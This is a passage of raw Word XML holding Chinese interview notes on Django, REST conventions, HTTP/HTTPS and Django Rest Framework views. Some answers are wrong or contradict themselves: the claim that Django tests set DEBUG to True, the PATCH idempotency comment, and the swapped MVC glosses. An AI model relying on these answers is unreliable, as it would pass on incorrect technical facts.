        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F187B1" w14:textId="14FBB9DA" w:rsidR="001E7149" w:rsidRPr="00BF3003"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049</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中如何实现单元测试</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>unittest</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3BD806"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单元测试是class类（继承TestCase），每一个测试方法必须以"test"开头。你可以重写setUp()（测试开始之前的操作）和tearDown()（测试结束之后的操作）方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50EF6C43" w14:textId="613DC859"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常用的断言方法：assertEqual()。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1933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会单独新建一个测试数据库来进行数据库的操作方面的测试，垃圾数据默认在测试完成后销毁。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE5748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Django单元测试时为了模拟生产环境，会修改settings中的变量，例如, 把DEBUG变量修改为True, 把ALLOWED_HOSTS修改为[*]。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522680EE" w14:textId="12700D3B" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="00BA4DA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051</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w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中如何根据数据库表生成</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中的类？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2D011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1、修改seting文件，在setting里面设置要连接的数据库类型和名称、地址</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8F353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2、运行下面代码可以自动生成models模型文件</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF8FD0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python manage.py </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>inspectdb</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt; app/models.py 　　　　# inspectdb 监测数据库的意思</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E100062" w14:textId="17C13D69" w:rsidR="001E7149" w:rsidRPr="001A250B" w:rsidRDefault="00BA4DA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052</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使用</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和原生</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的优缺点？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76EB9F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SQL：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="485A3F5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优点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493BBD3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执行速度快</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D61EE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缺点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="186C417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编写复杂，开发效率不高</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE8098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ORM：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C233B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优点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A47E6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让用户不再写SQL语句，提高开发效率</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236C2EC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可以很方便地引入数据缓存之类的附加功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="084BC9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缺点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E7C71A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在处理多表联查、where条件复杂查询时，ORM的语法会变得复杂。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67221ACB"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没有原生SQL速度快</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226ABDE2" w14:textId="4A7079EE" w:rsidR="001E7149" w:rsidRPr="00BF3003"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053</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简述</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MTV</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74033C4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MVC：model、view(显示)、controller(视图)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B0EFA3"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MTV：model、tempalte、view </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2D2E77" w14:textId="04DB21EB"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二者本质没有区别。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="621673AF" w14:textId="4AB293A6" w:rsidR="001E7149" w:rsidRPr="001A250B"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055</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谈谈你对</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Restfull</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>规范的认识？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1260E10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Restful其实就是一套编写接口的'风格规范'，规定如何编写以及如何设置返回值、状态码等信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A4DA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最显著的特点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346AB27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用Restful: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4DE18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给用户一个url，再根据不同的method在后端做不同的处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D14DB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比如：post创建数据、get获取数据、put和patch修改数据、delete删除数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429F00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不用Restful: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F56A0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给调用者很多url，每个url代表一个功能，比如：add_user/delte_user/edit_user/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F2A93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当然，还有其他的，比如：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D52DF8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'版本' 来控制让程序有多个版本共存的情况，版本可以放在 url、请求头（accept/自定义）、GET参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F550BA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'状态码' 200/300/400/500</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CAC59C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'url中尽量使用名词' restful也可以称为“面向资源编程”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFC56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'api标示'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D98AD1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api.luffycity.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7535EF33"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www.luffycity.com/api/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3126642D" w14:textId="31379909" w:rsidR="001E7149" w:rsidRPr="001A250B"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056</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接口的幂等性是什么意思？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DDD48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第一次访问一个接口后，再对该接口进行N次相同的访问时，对资源不造影响，就认为接口具有幂等性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612E67F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  #第一次获取结果、第二次也是获取结果对资源都不会造成影响，幂等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C57B91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POST， #第一次新增数据，第二次也会再次新增，非幂等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6558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PUT，  #第一次更新数据，第二次不会再次更新，幂等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FF994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PATCH，#第一次更新数据，第二次不会再次更新，非幂等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A84703"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DELTE，#第一次删除数据，第二次不在再删除，幂等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B8E821" w14:textId="4D363483" w:rsidR="001E7149" w:rsidRPr="00BF3003"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057</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什么是</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>RPC</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50ADE9A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'远程过程调用协议'。是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。进化的顺序: 现有的RPC,然后有的RESTful规范</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE92680" w14:textId="15B91BAA" w:rsidR="001E7149" w:rsidRPr="001A250B"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bookmarkStart w:id="52" w:name="_Hlk44366566"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>058</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Http</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Https</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D76CD5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 80端口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B0A8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#https: 443端口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21486F4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#http信息是明文传输，https则是具有安全性的ssl加密传输协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E2CB0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自定义证书 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="019438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服务端：创建一对证书</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E4154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客户端：必须携带证书</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B59E46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购买证书</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="629C6FA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服务端： 创建一对证书，。。。。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2673C07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客户端： 去机构获取证书，数据加密后发给咱们的服务单</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41AB0A7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 证书机构:公钥给改机构</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="52"/>
    <w:p w14:paraId="59BC64E5" w14:textId="77B8B357" w:rsidR="001E7149" w:rsidRPr="00BF3003"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059</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为什么要使用</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django Rest Framework</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B7788D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在编写接口时可以不使用django rest framework框。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C9B6A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不使用：也可以做，可以用django的CBV来实现，开发者编写的代码会更多一些。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7061D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使用：内部帮助我们提供了很多方便的组件，我们通过配置就可以完成相应操作，如：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E66015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'序列化'可以做用户请求数据校验+queryset对象的序列化称为json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4D719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'解析器'获取用户请求数据request.data，会自动根据content-type请求头的不能对数据进行解析</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480AAC2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'分页'将从数据库获取到的数据在页面进行分页显示</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7B444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#还有其他组件：'认证'、'权限'、'访问频率控制'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF68DFC" w14:textId="6CB56068" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="00F620C1"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060</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 Rest Framework</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架中都有那些组件？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B1FF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路由，自动帮助开发者快速为一个视图创建4个url</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B5BE0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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="524748A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www.oldboyedu.com/api/v1/student(?P&lt;format&gt;\w+)$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BB77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www.oldboyedu.com/api/v1/student/(?P&lt;pk&gt;\d+)/$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F1B4B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www.oldboyedu.com/api/v1/student/(?P&lt;pk&gt;\d+)(?P&lt;format&gt;\w+)$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AEDE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版本处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1799837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问题：版本都可以放在那里？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7754B52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url</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07B6AC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GET </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05FDE2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请求头 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E5C1C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认证 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4448B5C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问题：认证流程？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347196B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权限 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04AEB52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权限是否可以放在中间件中？以及为什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D68837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访问频率的控制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D8948F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匿名用户可以真正的防止？无法做到真正的访问频率控制，只能把小白拒之门外。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C0536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如果要封IP，使用防火墙来做。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4BF7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登录用户可以通过用户名作为唯一标示进行控制，如果有人注册很多账号，则无法防止。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5BF6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视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F07CF2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解析器 ，根据Content-Type请求头对请求体中的数据格式进行处理。request.data </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A355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分页</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A18AD0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序列化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB2871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序列化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF625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source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640586E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 定义方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4316403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请求数据格式校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47AB2D9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渲染器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D00D3FF" w14:textId="39A96EB8"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061</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 Rest Framework</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架中的视图都可以继承哪些类</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D1A4D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 继承APIView（最原始）但定制性比较强</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CACD53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这个类属于rest framework中的顶层类，内部帮助我们实现了只是基本功能：认证、权限、频率控制，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7BAE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但凡是数据库、分页等操作都需要手动去完成，比较原始。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF3FE5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GenericAPIView(APIView)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27721E5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post(...):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6001A57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pass </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A35041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b.继承GenericViewSet（ViewSetMixin，generics.GenericAPIView）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE9F1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首先他的路由就发生变化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE154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如果继承它之后，路由中的as_view需要填写对应关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="527925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在内部也帮助我们提供了一些方便的方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CABAD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get_queryset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311E3A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get_object</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB588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get_serializer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223F82F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get_serializer_class</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7990B8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get_serializer_context</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400EF7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filter_queryset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1935FD5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注意：要设置queryset字段，否则会抛出断言的异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4745B58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代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585290C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只提供增加功能 只继承GenericViewSet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72880E3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TestView(GenericViewSet):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6896F0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serialazer_class = xxx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="019A52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creat(self,*args,**kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1866E45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pass  # 获取数据并对数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5329C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 继承  modelviewset  --&gt; 快速快发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1776E83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-ModelViewSet(增删改查全有+数据库操作)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B830A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-mixins.CreateModelMixin（只有增）,GenericViewSet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="002F048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-mixins.CreateModelMixin,DestroyModelMixin,GenericViewSet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CDA00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对数据库和分页等操作不用我们在编写，只需要继承相关类即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39814F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0DFBEE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示例：只提供增加功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12AC2DD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class TestView(mixins.CreateModelMixin,GenericViewSet):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72675D3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serializer_class = XXXXXXX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02708F4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3347C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modelviewset --&gt; 快速开发，复杂点的genericview、apiview</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAAED17" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="001E7149" w:rsidP="001E7149">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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="72E9ADD7" wp14:editId="09BEF750">
            <wp:extent cx="6217920" cy="447611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7920" cy="4476115"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5688A2" w14:textId="23E4630F"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062</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简述</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django Rest Framework</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
